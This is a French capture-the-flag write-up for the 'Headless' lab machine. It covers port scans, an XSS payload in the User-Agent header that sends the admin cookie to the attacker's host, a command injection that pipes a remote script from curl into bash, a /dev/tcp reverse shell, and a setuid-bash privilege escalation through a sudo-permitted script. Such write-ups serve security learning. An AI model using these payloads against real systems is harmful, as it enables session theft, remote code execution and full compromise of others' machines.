  # Headless

	echo "10.10.11.8 headless.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.8 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.8 -oN nmap.txt
	feroxbuster --silent -u http://headless.htb:5000
	
Scans classiques.

    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
    5000/tcp open  upnp?

http://10.10.11.8:5000/support => Formulaire de contact
<br>http://10.10.11.8:5000/dashboard => 401


En mettant le payload "#{}()[];<>&/" dans le message, un pop-up apparaît pour me signifier qu'une tentative d'intrusion a été détectée et que tout cela a été envoyé à l'administrateur. Cela ressemble à un scénario de XSS ou de CSRF. On peut aussi observer le cookie "is_admin" en bas.

C'est une simple XSS dans le user-agent avec exfiltration de cookie : 

    User-Agent: <img+src%3dx+onerror%3dfetch('http%3a//10.10.16.110%3a8000/'%2bdocument.cookie)%3b>

Après quelques temps, on reçoit bien le cookie de l'administrateur : 

    10.10.11.8 - - [24/Mar/2024 12:55:33] "GET /is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 404 -

On peut se connecter au dashboard avec ce cookie.

L'étape d'après est une simple injection de commande dans cette même page : 

    date=2023-09-15;curl http://10.10.16.110/rev.sh|bash

Fichier rev.sh : 

    #!/bin/bash
    /bin/bash -c 'exec bash -i &>/dev/tcp/10.10.16.110/9999 <&1'

On obtient bien le shell au bout de quelques secondes : 

    cat /home/dvir/user.txt


## Élévation de privilèges

	sudo -l

>    (ALL) NOPASSWD: /usr/bin/syscheck

    cat /usr/bin/syscheck
    echo "chmod 4777 /bin/bash" > initdb.sh
    chmod +x initdb.sh
    sudo syscheck
    /bin/bash -p
	whoami
	cat /root/root.txt
